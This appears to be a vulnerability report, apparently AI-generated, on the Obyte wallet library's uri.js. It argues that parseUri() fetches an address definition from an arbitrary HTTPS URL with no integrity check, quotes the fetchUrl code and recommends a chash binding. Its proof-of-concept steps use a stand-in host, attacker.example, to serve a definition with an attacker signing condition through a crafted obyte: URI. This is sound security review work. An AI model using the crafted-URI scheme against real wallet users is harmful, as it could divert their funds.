Found it: `parseUri` in `uri.js` fetches an AA/definition template from an arbitrary `https://` URL and injects the raw response directly into the address-definition payload, without any hash/signature check tying the fetched content to anything the user actually approved.

### Title
Unauthenticated Remote Definition Fetch in `uri.js` `parseUri()` Allows Arbitrary Definition Injection - (File: uri.js)

### Summary
When a wallet user scans/opens a `byteball:`/`obyte:` URI with `app=definition` and a `definition` parameter starting with `https://`, `parseUri()` calls `fetchUrl()` to retrieve the definition content over plain HTTPS `GET` and directly substitutes the raw response body into `assocParams.definition` — the value that becomes the address/AA definition the user is asked to sign/post. [1](#0-0)  There is no hash, signature, or chash check performed on the fetched content in `parseUri()` itself before returning it to the caller as the trusted "definition" value.

### Finding Description
`fetchUrl()` performs a bare `https.get()` and returns whatever bytes/string the server sends, with only a `resp.statusCode !== 200` check — no content hashing, no pinning, no verification against a previously agreed value. [2](#0-1)  In `parseUri()`, this fetched, unauthenticated string is assigned straight into `assocParams.definition`, which is the field ultimately surfaced to the wallet UI/flow as "the definition to use" for the `app=definition` request encoded in the URI. [3](#0-2) 

This mirrors the WinGUp bug class precisely: a URI (analogous to an update-manifest pointer) is dereferenced over the network and the fetched payload is trusted and forwarded downstream without any cryptographic integrity binding (no hash-of-URI-content check, no chash verification against an expected address at this stage). Anyone who can influence DNS/TLS termination for the referenced host (a malicious or compromised web server operator, a MITM on a broken/expired cert, or simply the third party who controls the URL used to construct the scanned QR/link) can serve arbitrary JSON that becomes the "definition" the wallet subsequently tries to use, changing which oscript/authentifier logic is bound to that flow.

Downstream, this is safety-netted in most cases: unit-level validation of an actual on-chain `definition` message enforces `payload.address === objectHash.getChash160(payload.definition)` [4](#0-3) , and `readDefinitionByAddress` / `validateDefinition` recompute the chash before accepting any address definition [5](#0-4) . However, `parseUri()` sits upstream of that: it is invoked by wallet/UI code as a convenience parser for user-facing requests, and the value it injects into `objRequest.definition` is not itself chash-checked against anything at this layer — the fetched content is trusted at face value for whatever the caller does with it before (or instead of) full on-chain validation (e.g. rendering a signing prompt, prefilling wallet UI fields, or building a shared-address offer to a peer).

### Impact Explanation
If a caller of `parseUri()` uses the returned `assocParams.definition` for anything before independently re-verifying it as a definition bound to a specific address (e.g., displaying it to the user for approval, or feeding it into a shared/multisig address creation or arbiter/prosaic contract flow), a network-position or malicious-server attacker can substitute a definition with attacker-favorable signing conditions (e.g., adding an attacker-controlled key or weakening the authentifier requirement), leading to loss of funds sent to or signed under that definition. This lands in the "wallet and contract message handling" / "address definitions and authentifiers" category explicitly in scope.

### Likelihood Explanation
Requires the victim to open a crafted `byteball:`/`obyte:` URI whose `definition` parameter points to an attacker-controlled or attacker-intercepted HTTPS URL, and requires the app to use the fetched definition without independently re-deriving/verifying the chash before it matters (e.g., before user approval/signing). Given that the on-chain `definition` message validation (`validateInlinePayload`, case `"definition"`) does perform the chash check before the unit is ever committed, exploitation is bounded to the pre-commit UX/handling window rather than resulting in an invalid unit being accepted by the network.

### Recommendation
Do not fetch and substitute remote content as a trusted definition inside `parseUri()`. At minimum, require the URI to also carry an expected chash/address for the definition and verify `objectHash.getChash160(fetchedDefinition) === expectedAddress` immediately after `fetchUrl()` returns, before assigning it to `assocParams.definition`, mirroring the same-purpose check already used in `validation.js`'s `"definition"` case. Reject or flag definitions fetched from URLs when no such binding can be verified.

### Proof of Concept
1. Attacker hosts `https://attacker.example/def.json` returning a JSON array `['and', [attacker_sig_condition, legit_condition]]` (or any AA/definition template favorable to the attacker).
2. Attacker crafts `obyte:data?app=definition&definition=https://attacker.example/def.json&...` and delivers it via QR code/link to the victim.
3. Victim's wallet calls `parseUri()`, which calls `fetchUrl('https://attacker.example/def.json', ...)` [6](#0-5)  and sets `assocParams.definition` to the attacker's JSON with no integrity check.
4. If the wallet flow presents/uses this definition before independent chash verification (e.g., in a UI preview, or when composing a shared-address offer), the attacker's malicious definition is trusted at that point, analogous to WinGUp trusting an unverified downloaded installer.

Note: I could not find, within the indexed portion of the codebase, the exact downstream UI/wallet call site that consumes `objRequest.definition` from `parseUri()` to confirm whether every caller re-verifies the chash before use — this should be confirmed with a full repository check (e.g., via a Devin session) since index size limits may have excluded some caller files.

```javascript
function fetchUrl(url, cb) {
	var https = require('https');
	var bDone = false;
	function returnError(err) {
		console.log(err);
		if (bDone)
			return;
		bDone = true;
		cb(err);
	}
	try {
		https.get(url, function (resp) {
			if (resp.statusCode !== 200)
				return returnError("non-200 response while trying to fetch " + url);
			var data = '';

			// A chunk of data has been recieved.
			resp.on('data', function(chunk) {
				data += chunk;
			});

			// aborted before the whole response has been received
			resp.on('aborted', function () {
				returnError("connection aborted while trying to fetch " + url);
			});

			// The whole response has been received
			resp.on('end', function () {
				if (bDone)
					return;
				bDone = true;
				cb(null, data);
			});
		}).on("error", function(err) {
			returnError("non-200 response while trying to fetch " + url + ": " + err.message);
		});
	}
	catch(err) {
		returnError(err.message);
	}
}
```
